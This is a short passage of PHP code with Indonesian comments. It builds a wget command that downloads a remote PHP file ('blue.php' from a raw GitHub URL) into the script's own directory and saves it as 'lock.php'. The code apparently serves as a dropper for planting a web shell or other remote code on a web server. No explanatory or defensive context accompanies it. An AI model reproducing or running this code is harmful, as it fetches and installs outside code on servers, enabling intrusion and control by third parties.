...
$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/blue.php';

// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Buat perintah wget
$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/lock.php');
